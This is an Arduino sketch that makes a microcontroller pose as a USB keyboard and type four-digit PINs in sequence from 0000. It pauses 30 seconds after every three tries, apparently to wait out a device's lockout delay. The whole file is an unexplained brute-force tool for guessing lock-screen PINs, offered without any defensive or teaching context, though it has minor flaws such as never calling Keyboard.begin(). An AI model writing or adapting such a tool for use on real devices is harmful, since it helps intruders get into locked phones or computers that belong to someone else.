#include <Keyboard.h>

int DIGIT_0 = 0;
int DIGITN = 0;
int COUNT = 0;
int MAX_TRIES = 3;
int SECURITY_DELAY = 30; // (In seconds)
String DIGITNs = "0";

void setup() {
}

void loop() {
  delay(3000);
  String DIGITNs = String(DIGITN);
  while (COUNT <= 5) {
    if (DIGITNs.length() == 1) {
      Keyboard.print(DIGIT_0);
      Keyboard.print(DIGIT_0);
      Keyboard.print(DIGIT_0);
    }
    if (DIGITNs.length() == 2) {
      Keyboard.print(DIGIT_0);
      Keyboard.print(DIGIT_0);
    }
    if (DIGITNs.length() == 3) {
      Keyboard.print(DIGIT_0);
    }
    Keyboard.println(DIGITN);
    DIGITN++;
    COUNT++;
    if (COUNT == MAX_TRIES) {
      COUNT = 0;
      delay(SECURITY_DELAY * 1000);
    }
    if (DIGITN == 9999) {
      while (true) {
        delay(100);
      }
    }
    delay(100);
  }
}
